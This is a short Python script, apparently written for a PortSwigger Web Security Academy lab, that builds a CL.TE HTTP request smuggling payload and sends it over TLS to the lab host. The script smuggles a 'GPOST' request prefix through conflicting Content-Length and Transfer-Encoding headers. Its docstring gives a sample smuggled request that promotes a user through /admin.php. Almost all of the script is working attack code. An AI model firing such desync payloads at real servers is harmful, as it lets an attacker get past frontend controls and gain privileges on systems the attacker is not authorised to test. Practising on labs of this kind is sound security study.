import socket, ssl
from rich.console import Console
from rich.syntax import Syntax
'''
    - CL.TE occurs when the frontend interprets a request using the Content-Length header and
      then sends it to a backend server that interprets the same request using the Transfer-Encoding header.
    - this can happen if the frontend server does not support Transfer Encoding

    ---request---
    POST / HTTP/1.1
    Host: clte.htb
    Content-Length: 52
    Transfer-Encoding: chunked
    
    0

    POST /admin.php?promote_uid=2 HTTP/1.1
    Dummy: 
    ---/request---
'''

host = '0ae0006e044813fc8068538100770022.web-security-academy.net'
port = '443'

context = ssl.create_default_context()


# second request ---------------------------------------
second_req = '''GPOST / HTTP/1.1\r
Dummy: '''
len_second_req = len(second_req)
second_req = f'''{second_req}'''
# /second request ---------------------------------------


# main request ---------------------------------------
req = f'''POST / HTTP/1.1\r
Host: {host}\r
Content-Length: {len_second_req + 5}\r
Transfer-Encoding: chunked\r
\r
0\r
\r
{second_req}'''
# /main request ---------------------------------------


print(f'-------------------------')
print(f'{req}')
print(f'-------------------------')
# req = req.replace('\n', '\r\n')
req = req.encode()
print(f'{req=}')


with socket.create_connection((host, port)) as s:
    with context.wrap_socket(s, server_hostname=host) as secure_s:
        secure_s.sendall(req)
        resp = b''
        while True:
            data = secure_s.recv(4096)
            if not data: break
            resp += data

# print(f'{resp=}')
resp = resp.decode()
resp = resp.split('\r\n')
empty_index = resp.index('')

for i in range(empty_index+1):
    print(resp[i])

# console = Console()
# console.print(Syntax(resp[empty_index+1], 'html', theme='monokai', line_numbers=True))

# Note: at this point you would send another request to the server
# its reply will contain response from the smuggled request